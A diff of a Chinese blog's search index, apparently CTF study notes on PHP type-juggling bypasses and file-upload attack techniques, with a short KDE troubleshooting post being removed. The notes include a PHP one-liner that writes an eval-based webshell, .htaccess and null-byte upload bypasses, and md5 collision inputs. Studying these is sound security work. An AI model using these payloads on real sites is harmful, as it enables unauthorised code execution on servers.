-<h4 id="十六进制转换">十六进制转换</h4>
-<p>还存在一种十六进制余字符串进行比较运算时的问题。例子如下：</p>
-<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="string">"0x1e240"</span>==<span class="string">"123456"</span>		<span class="comment">//true</span></span><br><span class="line"><span class="string">"0x1e240"</span>==<span class="number">123456</span>		<span class="comment">//true</span></span><br><span class="line"><span class="string">"0x1e240"</span>==<span class="string">"1e240"</span>		<span class="comment">//false</span></span><br></pre></td></tr></table></figure>
-<p>当其中的一个字符串是0x开头的时候，PHP会将此字符串解析成为十进制然后再进行比较，0x1e240解析成为十进制就是123456，所以与 int 类型和 string 类型的 123456 比较都是相等。攻防平台中的<strong>起名字真难</strong>就是考察的这个特性。</p>
-<h4 id="json绕过">json绕过</h4>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'message'</span>])) &#123;</span><br><span class="line">    $message = json_decode($_POST[<span class="string">'message'</span>]);</span><br><span class="line">    $key =<span class="string">"*********"</span>;</span><br><span class="line">    <span class="keyword">if</span> ($message-&gt;key ==$key ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"~~~~"</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>输入一个json类型的字符串，json_decode函数解密成一个数组，判断数组中key的值是否等于$key的值，但$key的值我们不知道,这时我们构造一个和任意字符串返回为真的数组{“key”:true}。即可绕过。</p>
-<p>payload: message={“key”,true}</p>
-<h3 id="内置函数的参数松散性">内置函数的参数松散性</h3>
-<h4 id="md5-强等的绕过">md5()  强等的绕过</h4>
-<p>md5()中的需要是一个string类型的参数。如果md5 函数的参数是一个数组值，会导致函数返回 false。除了 md5 之外 sha1 函数也有这个特性。 例如传入为 <code>?a[]=1&amp;b[]=2</code></p>
-<p>或者找到 md5 值相等的二进制数据：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line"></span><br><span class="line">b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>
-<h4 id="strcmp">strcmp()</h4>
-<p>strcmp()函数在PHP官方手册中的描述是<code>int strcmp ( string $str1 , string $str2 )</code>,需要给strcmp()传递2个string类型的参数。如果str1小于str2,返回-1，相等返回0，否则返回1。strcmp函数比较字符串的本质是将两个变量转换为ascii，然后进行减法运算，然后根据运算结果来决定返回值。<br>
-如果传入给出strcmp()的参数是其它类型，可能产生其它不希望的结果。如：</p>
-<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">$<span class="built_in">array</span>=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">var_dump(strcmp($<span class="built_in">array</span>,<span class="string">'123'</span>)); <span class="comment">//null,在某种意义上null也就是相当于false，。</span></span><br></pre></td></tr></table></figure>
-<h4 id="switch">switch()</h4>
-<p>如果switch是数字类型的case的判断时，switch会将其中的参数转换为int类型。如下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$i =<span class="string">"2abc"</span>;</span><br><span class="line"><span class="keyword">switch</span> ($i) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"i is less than 3 but not negative"</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"i is 3"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这个时候程序输出的是<code>i is less than 3 but not negative</code>，是由于switch()函数将$i进行了类型转换，转换结果为2。</p>
-<h4 id="in-array">in_array()</h4>
-<p>在PHP手册中，in_array()函数的解释是<code>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</code>,如果strict参数没有提供，那么in_array就会使用松散比较来判断$needle是否在$haystack中。当strince的值为true时，needls的类型和haystack中的类型会被严格比较。</p>
-<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">$<span class="built_in">array</span>=<span class="literal">[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,'<span class="number">3</span>']</span>;</span><br><span class="line">var<span class="constructor">_dump(<span class="params">in_array</span>('<span class="params">abc</span>', $<span class="params">array</span>)</span>);  <span class="comment">//true</span></span><br><span class="line">var<span class="constructor">_dump(<span class="params">in_array</span>('1bc', $<span class="params">array</span>)</span>);	<span class="comment">//true</span></span><br></pre></td></tr></table></figure>
-<p>array_search()与in_array()也有一样的问题。</p>
-<h2 id="PHP-Filter-相关姿势">PHP Filter 相关姿势</h2>
-<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=</span><br></pre></td></tr></table></figure>]]></content>
+<h2 id="上传及绕过">上传及绕过</h2>
+<h3 id="常见上传点">常见上传点</h3>
+<ul>
+<li>上传头像</li>
+<li>上传相册</li>
+<li>上传附件</li>
+<li>添加文章图片</li>
+<li>前台留言资料上传</li>
+<li>编辑器文件上传</li>
+</ul>
+<h3 id="后缀绕过">后缀绕过</h3>
+<ul>
+<li>PHP:php2、php3、php5、phtml、pht(是否解析需要根据配置文件中设置类型来决定)</li>
+<li>ASP：asa、cer、cdx</li>
+<li>ASPX：ascx、ashx、asac</li>
+<li>JSP：jsp、jspx、jspf</li>
+</ul>
+<h3 id="绕过类型">绕过类型</h3>
+<ul>
+<li>Content-Type绕过</li>
+<li>前端绕过</li>
+<li>文件解析规则绕过</li>
+<li>Windows环境特性绕过</li>
+<li>文件名大小写绕过</li>
+<li>双写绕过</li>
+<li>点空格绕过</li>
+<li>文件头绕过</li>
+<li>条件竞争绕过</li>
+</ul>
+<h2 id="漏洞在系统中的差异">漏洞在系统中的差异</h2>
+<h3 id="IIS-5-x-6-0-解析漏洞">IIS 5.x/6.0 解析漏洞</h3>
+<p>1、当创建.asp的文件目录的时候，在此目录下的任意文件，服务器都解析为asp文件。例如：<br>
+漏洞目录利用形式：<a href="http://www.xxx.com/xx.asp/xx.jpg%E3%80%82" target="_blank" rel="noopener">www.xxx.com/xx.asp/xx.jpg。</a><br>
+xx.jpg的内容可以为一段合法的asp脚本文件。<br>
+2、服务器默认不解析”;“以后的内容，导致xx.asp;.jpg被解析成xx.asp<br>
+漏洞文件利用形式：<a href="http://www.xxx.com/xx.asp;.jpg" target="_blank" rel="noopener">www.xxx.com/xx.asp;.jpg</a><br>
+xx.jpg的内容可以为一段合法的asp脚本文件。</p>
+<h3 id="Nginx-解析漏洞">Nginx 解析漏洞</h3>
+<p>在低版本Nginx中存在一个由PHP-CGI导致的文件解析漏洞。在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo在本机中位于php.ini配置文件中，默认是开启的，当URL中有不存在的文件时，PHP就会默认向前解析。</p>
+<p>普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。访问<code>http://www.xx.com/phpinfo.jpg/1.php</code> 这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP-CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢？这就要说到fix_pathinfo这个选项了。如果开启了这个选项，那么就会触发在PHP中的如下逻辑：PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了。</p>
+<p>在默认Fast-CGI开启状况下上传名字为xx.jpg,内容为:<br>
+<code>&lt;?PHP fputs(fopen('shell.php','w'),'&lt;?php eval($_POST[cmd])?&gt;');?&gt;</code></p>
+<p>然后访问xx.jpg/.php,在这个目录下就会生成一句话木马shell.php。</p>
+<h3 id="Apache-解析漏洞">Apache 解析漏洞</h3>
+<p>Apache 在1.x和2.x版本中存在解析漏洞，例如如下地址格式：</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">www<span class="selector-class">.xxxx</span>.com/apache<span class="selector-class">.php</span><span class="selector-class">.bbb</span>.aaa</span><br></pre></td></tr></table></figure>
+<p>Apache从右至左开始判断后缀，若aaa非可识别后缀，再判断bbb，直到找到可识别后缀为止，然后将该可识别后缀进解析，因此如上地址解析为访问apache.php文件。</p>
+<p>另外对于Apache解析漏洞的正确说法应该是，使用module模式与php结合的所有版本apache存在未知扩展名解析漏洞，使用fastcgi模式与php结合的所有版本apache不存在此漏洞。而是否解析的后缀名在文件mime.types（互联网媒体类型（Internet media type，也称为MIME类型（<em>MIME type</em>）或内容类型（<em>content type</em>））中查找是否出现。</p>
+<h2 id="测试方法">测试方法</h2>
+<h3 id="前端验证">前端验证</h3>
+<p>只在前端利用JS来做效验，采用禁用JS上传、抓包上传都可以绕过此处限制。</p>
+<h3 id="htaccess规则文件绕过">.htaccess规则文件绕过</h3>
+<p>在一些启用了.htaccess文件的网站上就可以使用此文件类型来绕过限制较全面的黑名单过滤。</p>
+<p>先上传一个.htaccess文件，内容为：<code>AddType application/x-httpd-php .aaa</code>。然后再上传文件后缀为.aaa的文件，让其解析为php类型文件。上传成功后即可访问并getshell。</p>
+<h3 id="文件名后缀大小写混合绕过">文件名后缀大小写混合绕过</h3>
+<p>在对后缀的判断中，如果只是对字符串进行单独的比较来判断是不是限制文件，可以采用后缀名大小写绕过形式。如<code>a.PHp</code>。</p>
+<h3 id="Windows文件流特性绕过">Windows文件流特性绕过</h3>
+<p>流文件，即NTFS交换数据流（alternate data  streams，简称ADS），是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，它使用资源派生来维持与文件相关的信息。创建一个数据交换流文件的方法很简单，命令为“宿主文件:准备与宿主文件关联的数据流文件”。</p>
+<p>上传文件：<code>xxx.php::$data</code>。访问时可以直接访问xxx.php文件。</p>
+<h3 id="00截断绕过">%00截断绕过</h3>
+<p>以上问题被绕过的根本原因是采用了一些有缺陷的黑名单限制，一般采用白名单的限制会减少相当多的绕过问题产生，但是并不意味着一定安全，在某些没有处理严格的程序上，仍然可以采用截断绕过的形式。</p>
+<p>例如：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看出代码采用的白名单校验，只允许上传图片格式，理论上这个上传是不好绕过的。但是后面采用保存文件的时候，是路径拼接的形式，而路径又是从前端获取，所以我们可以采用在路径上截断。如下上传，显示文件路径中有个空格，这并不是真正意义上的空格，而是%00截断后显示成的空格。</p>
+<p><img src="https://misakikata.github.io/2019/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1559095054720.png" alt="1559095054720"></p>
+<h3 id="文件头检测绕过">文件头检测绕过</h3>
+<p>JPG：文件头前十个字节为<code>FF D8 FF E0 00 10 4A 46 49 46</code>，FF D8代表SOI标记，意思是图像文件开始值。<code>4A 46 49 46</code>代表字符串JFIF标记。</p>
+<p>PNG：开头4字节为右栏中<code>‰PNG</code>字样，PNG的8字节文件署名域用来识别该文件是不是PNG文件。也就是<code>89 50 4E 47 0D 0A 1A 0A</code>。</p>
+<p>GIF：GIF89a</p>
+<h2 id="利用工具实现FUZZ">利用工具实现FUZZ</h2>
+<p>很多网站对上传进行拦截的时候采取的是黑名单校验，当我们看到黑名单的时候就可以考虑采取修改后缀、截断等方式尝试绕过。</p>
+<p>采用工具 <a href="https://github.com/c0ny1/upload-fuzz-dic-builder" target="_blank" rel="noopener">https://github.com/c0ny1/upload-fuzz-dic-builder</a> 来生成fuzz的字典。执行命令:</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">python</span> <span class="selector-tag">upload-fuzz-dic-builder</span><span class="selector-class">.py</span> <span class="selector-tag">-n</span> <span class="selector-tag">test</span> <span class="selector-tag">-a</span> <span class="selector-tag">jpg</span> <span class="selector-tag">-l</span> <span class="selector-tag">php</span> <span class="selector-tag">-m</span> <span class="selector-tag">apache</span> <span class="selector-tag">--os</span> <span class="selector-tag">win</span> <span class="selector-tag">-o</span> <span class="selector-tag">upload_file</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>
+<p>把生成的字典导入burp中，同时取消payload-encoding的选中状态。执行后可以看到有些php文件上传成功。然后访问其中上传成功的文件，查看是否执行。</p>
+]]></content>
       <categories>
         <category>网络安全</category>
       </categories>
       <tags>
         <tag>CTF</tag>
-        <tag>PHP</tag>
       </tags>
   </entry>
   <entry>
@@ -1765,209 +1968,6 @@ md5 值为 <code>\x06\xdaT0D\x9f\x8fo#\xdf\xc1'or'8</code> 也可行。</p>
       <tags>
         <tag>PHP</tag>
         <tag>Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件上传操作整理</title>
-    <url>/2020/07/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%93%8D%E4%BD%9C%E6%95%B4%E7%90%86/</url>
-    <content><![CDATA[<p>获取Webshell的常见操作，整理一下。</p>
-<a id="more"></a>
-<h2 id="上传及绕过">上传及绕过</h2>
-<h3 id="常见上传点">常见上传点</h3>
-<ul>
-<li>上传头像</li>
-<li>上传相册</li>
-<li>上传附件</li>
-<li>添加文章图片</li>
-<li>前台留言资料上传</li>
-<li>编辑器文件上传</li>
-</ul>
-<h3 id="后缀绕过">后缀绕过</h3>
-<ul>
-<li>PHP:php2、php3、php5、phtml、pht(是否解析需要根据配置文件中设置类型来决定)</li>
-<li>ASP：asa、cer、cdx</li>
-<li>ASPX：ascx、ashx、asac</li>
-<li>JSP：jsp、jspx、jspf</li>
-</ul>
-<h3 id="绕过类型">绕过类型</h3>
-<ul>
-<li>Content-Type绕过</li>
-<li>前端绕过</li>
-<li>文件解析规则绕过</li>
-<li>Windows环境特性绕过</li>
-<li>文件名大小写绕过</li>
-<li>双写绕过</li>
-<li>点空格绕过</li>
-<li>文件头绕过</li>
-<li>条件竞争绕过</li>
-</ul>
-<h2 id="漏洞在系统中的差异">漏洞在系统中的差异</h2>
-<h3 id="IIS-5-x-6-0-解析漏洞">IIS 5.x/6.0 解析漏洞</h3>
-<p>1、当创建.asp的文件目录的时候，在此目录下的任意文件，服务器都解析为asp文件。例如：<br>
-漏洞目录利用形式：<a href="http://www.xxx.com/xx.asp/xx.jpg%E3%80%82" target="_blank" rel="noopener">www.xxx.com/xx.asp/xx.jpg。</a><br>
-xx.jpg的内容可以为一段合法的asp脚本文件。<br>
-2、服务器默认不解析”;“以后的内容，导致xx.asp;.jpg被解析成xx.asp<br>
-漏洞文件利用形式：<a href="http://www.xxx.com/xx.asp;.jpg" target="_blank" rel="noopener">www.xxx.com/xx.asp;.jpg</a><br>
-xx.jpg的内容可以为一段合法的asp脚本文件。</p>
-<h3 id="Nginx-解析漏洞">Nginx 解析漏洞</h3>
-<p>在低版本Nginx中存在一个由PHP-CGI导致的文件解析漏洞。在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo在本机中位于php.ini配置文件中，默认是开启的，当URL中有不存在的文件时，PHP就会默认向前解析。</p>
-<p>普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。访问<code>http://www.xx.com/phpinfo.jpg/1.php</code> 这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP-CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢？这就要说到fix_pathinfo这个选项了。如果开启了这个选项，那么就会触发在PHP中的如下逻辑：PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了。</p>
-<p>在默认Fast-CGI开启状况下上传名字为xx.jpg,内容为:<br>
-<code>&lt;?PHP fputs(fopen('shell.php','w'),'&lt;?php eval($_POST[cmd])?&gt;');?&gt;</code></p>
-<p>然后访问xx.jpg/.php,在这个目录下就会生成一句话木马shell.php。</p>
-<h3 id="Apache-解析漏洞">Apache 解析漏洞</h3>
-<p>Apache 在1.x和2.x版本中存在解析漏洞，例如如下地址格式：</p>
-<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">www<span class="selector-class">.xxxx</span>.com/apache<span class="selector-class">.php</span><span class="selector-class">.bbb</span>.aaa</span><br></pre></td></tr></table></figure>
-<p>Apache从右至左开始判断后缀，若aaa非可识别后缀，再判断bbb，直到找到可识别后缀为止，然后将该可识别后缀进解析，因此如上地址解析为访问apache.php文件。</p>
-<p>另外对于Apache解析漏洞的正确说法应该是，使用module模式与php结合的所有版本apache存在未知扩展名解析漏洞，使用fastcgi模式与php结合的所有版本apache不存在此漏洞。而是否解析的后缀名在文件mime.types（互联网媒体类型（Internet media type，也称为MIME类型（<em>MIME type</em>）或内容类型（<em>content type</em>））中查找是否出现。</p>
-<h2 id="测试方法">测试方法</h2>
-<h3 id="前端验证">前端验证</h3>
-<p>只在前端利用JS来做效验，采用禁用JS上传、抓包上传都可以绕过此处限制。</p>
-<h3 id="htaccess规则文件绕过">.htaccess规则文件绕过</h3>
-<p>在一些启用了.htaccess文件的网站上就可以使用此文件类型来绕过限制较全面的黑名单过滤。</p>
-<p>先上传一个.htaccess文件，内容为：<code>AddType application/x-httpd-php .aaa</code>。然后再上传文件后缀为.aaa的文件，让其解析为php类型文件。上传成功后即可访问并getshell。</p>
-<h3 id="文件名后缀大小写混合绕过">文件名后缀大小写混合绕过</h3>
-<p>在对后缀的判断中，如果只是对字符串进行单独的比较来判断是不是限制文件，可以采用后缀名大小写绕过形式。如<code>a.PHp</code>。</p>
-<h3 id="Windows文件流特性绕过">Windows文件流特性绕过</h3>
-<p>流文件，即NTFS交换数据流（alternate data  streams，简称ADS），是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，它使用资源派生来维持与文件相关的信息。创建一个数据交换流文件的方法很简单，命令为“宿主文件:准备与宿主文件关联的数据流文件”。</p>
-<p>上传文件：<code>xxx.php::$data</code>。访问时可以直接访问xxx.php文件。</p>
-<h3 id="00截断绕过">%00截断绕过</h3>
-<p>以上问题被绕过的根本原因是采用了一些有缺陷的黑名单限制，一般采用白名单的限制会减少相当多的绕过问题产生，但是并不意味着一定安全，在某些没有处理严格的程序上，仍然可以采用截断绕过的形式。</p>
-<p>例如：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>可以看出代码采用的白名单校验，只允许上传图片格式，理论上这个上传是不好绕过的。但是后面采用保存文件的时候，是路径拼接的形式，而路径又是从前端获取，所以我们可以采用在路径上截断。如下上传，显示文件路径中有个空格，这并不是真正意义上的空格，而是%00截断后显示成的空格。</p>
-<p><img src="https://misakikata.github.io/2019/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1559095054720.png" alt="1559095054720"></p>
-<h3 id="文件头检测绕过">文件头检测绕过</h3>
-<p>JPG：文件头前十个字节为<code>FF D8 FF E0 00 10 4A 46 49 46</code>，FF D8代表SOI标记，意思是图像文件开始值。<code>4A 46 49 46</code>代表字符串JFIF标记。</p>
-<p>PNG：开头4字节为右栏中<code>‰PNG</code>字样，PNG的8字节文件署名域用来识别该文件是不是PNG文件。也就是<code>89 50 4E 47 0D 0A 1A 0A</code>。</p>
-<p>GIF：GIF89a</p>
-<h2 id="利用工具实现FUZZ">利用工具实现FUZZ</h2>
-<p>很多网站对上传进行拦截的时候采取的是黑名单校验，当我们看到黑名单的时候就可以考虑采取修改后缀、截断等方式尝试绕过。</p>
-<p>采用工具 <a href="https://github.com/c0ny1/upload-fuzz-dic-builder" target="_blank" rel="noopener">https://github.com/c0ny1/upload-fuzz-dic-builder</a> 来生成fuzz的字典。执行命令:</p>
-<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">python</span> <span class="selector-tag">upload-fuzz-dic-builder</span><span class="selector-class">.py</span> <span class="selector-tag">-n</span> <span class="selector-tag">test</span> <span class="selector-tag">-a</span> <span class="selector-tag">jpg</span> <span class="selector-tag">-l</span> <span class="selector-tag">php</span> <span class="selector-tag">-m</span> <span class="selector-tag">apache</span> <span class="selector-tag">--os</span> <span class="selector-tag">win</span> <span class="selector-tag">-o</span> <span class="selector-tag">upload_file</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>
-<p>把生成的字典导入burp中，同时取消payload-encoding的选中状态。执行后可以看到有些php文件上传成功。然后访问其中上传成功的文件，查看是否执行。</p>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>解决更改Plasma桌面后KDE系统设置无法打开的问题</title>
-    <url>/2020/09/11/%E8%A7%A3%E5%86%B3%E6%9B%B4%E6%94%B9Plasma%E6%A1%8C%E9%9D%A2%E5%90%8EKDE%E7%B3%BB%E7%BB%9F%E8%AE%BE%E7%BD%AE%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E7%9A%84%E9%97%AE%E9%A2%98/</url>
-    <content><![CDATA[<p>更新 Manjaro Linux(KDE) 的 Plasma 主题包之后发现系统设置无法打开的解决方案。</p>
-<a id="more"></a>
-<h1>问题描述</h1>
-<p>在 Manjaro Linux 下配置 KDE Plasma 的时候更换了McMojave 主题。更换之后发现系统设置无法打开。猜测是由于主题的冲突导致的，于是猜测用切换成默认主题的方式可以解决此问题。但是一般更换默认主题的方式都是从系统设置入手，找到外观选项再切换主题，现在系统设置的 GUI 界面无法打开，于是尝试用其它方法更换成默认主题。</p>
-<h1>失败的尝试</h1>
-<h2 id="用中文搜索相关内容">用中文搜索相关内容</h2>
-<p>什么也没有。中文使用地区对操作系统问题的相关支持还是太薄弱了，即使有相关内容也一般都是及其过时的只言片语，相反转而去搜索英文内容的时候发现相关支持非常多，还是差距挺大的。也算获得了经验，以后遇到问题宁可去啃英文的文档也要减少对中文的依赖。</p>
-<h2 id="删除KDE设置项并重启">删除KDE设置项并重启</h2>
-<p>根据网络上的相关支持，将 <code>~/</code> 目录下的 <code>~/.kde/</code> 和 <code>~/.kde4/</code> 目录删除并重启，重启后发现 <code>~/.kde/</code> 目录自动生成了，其中的配置文件是根据当前主题的设置自动生成的。遂放弃。</p>
-<h2 id="重新安装-plasma-desktop-和-plasma-meta">重新安装 plasma-desktop 和 plasma-meta</h2>
-<p>重新安装之后发现没有任何变化。</p>
-<h1>成功的尝试</h1>
-<h2 id="用命令行检查系统设置GUI程序的问题">用命令行检查系统设置GUI程序的问题</h2>
-<p>Konsole 中键入 <code>systemsettings5</code> 以尝试从命令行启动系统设置。发现输出错误：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cyclic dependency detected between <span class="string">"file:///usr/lib/qt/qml/org/kde/kirigami.2/styles/org.kde.desktop.plasma/units.qml"</span> and <span class="string">"file:///usr/lib/qt/qml/org/kde/kirigami.2/styles/org.kde.desktop.plasma/units.qml"</span></span><br><span class="line">file:///usr/share/kpackage/genericqml/org.kde.systemsettings.sidebar/contents/ui/subcategorypage.qml:141:9: qml connections: implicitly defined onfoo properties <span class="keyword">in</span> connections are deprecated. use this syntax instead: <span class="keyword">function</span> onfoo(&lt;arguments&gt;) &#123; ... &#125;</span><br><span class="line">file:///usr/share/kpackage/genericqml/org.kde.systemsettings.sidebar/contents/ui/subcategorypage.qml:131:9: qml connections: implicitly defined onfoo properties <span class="keyword">in</span> connections are deprecated. use this syntax instead: <span class="keyword">function</span> onfoo(&lt;arguments&gt;) &#123; ... &#125;</span><br><span class="line">file:///usr/lib/qt/qml/org/kde/kirigami.2/private/refreshablescrollview.qml:143:13: qml connections: implicitly defined onfoo properties <span class="keyword">in</span> connections are deprecated. use this syntax instead: <span class="keyword">function</span> onfoo(&lt;arguments&gt;) &#123; ... &#125;</span><br><span class="line">file:///usr/lib/qt/qml/org/kde/kirigami.2/private/refreshablescrollview.qml:143:13: qml connections: implicitly defined onfoo properties <span class="keyword">in</span> connections are deprecated. use this syntax instead: <span class="keyword">function</span> onfoo(&lt;arguments&gt;) &#123; ... &#125; </span><br><span class="line">cyclic dependency detected between</span><br><span class="line"><span class="string">"file:///usr/lib/qt/qml/org/kde/kirigami.2/styles/org.kde.desktop.plasma/units.qml"</span> and</span><br><span class="line"><span class="string">"file:///usr/lib/qt/qml/org/kde/kirigami.2/styles/org.kde.desktop.plasma/units.qml"</span></span><br><span class="line">qqmlengine::setcontextforobject(): object already has a qqmlcontext qt.qpa.xcb:</span><br><span class="line">qxcbconnection: xcb error: 5 (badatom), sequence: 629, resource id: 0, major code: 20 (getproperty), minor code: 0</span><br></pre></td></tr></table></figure>
-<p>似乎确定了问题是由于新采用的主题产生了循环依赖之类的问题。接下来考虑如何将主题更换回默认。</p>
-<h2 id="从命令行将主题更换回-Breeze（默认主题）">从命令行将主题更换回 Breeze（默认主题）</h2>
-<p>使用 Konsole，键入 <code>systemsettings5 --style=Breeze</code>，绕过GUI界面从命令行直接更改主题。重启。系统设置可以打开，问题得到解决。</p>
-<p>详请参见：<a href="https://www.reddit.com/r/kde/comments/i0m5gz/system_settings_wont_open_after_changing/" target="_blank" rel="noopener">https://www.reddit.com/r/kde/comments/i0m5gz/system_settings_wont_open_after_changing/</a></p>
-<h1>感想</h1>
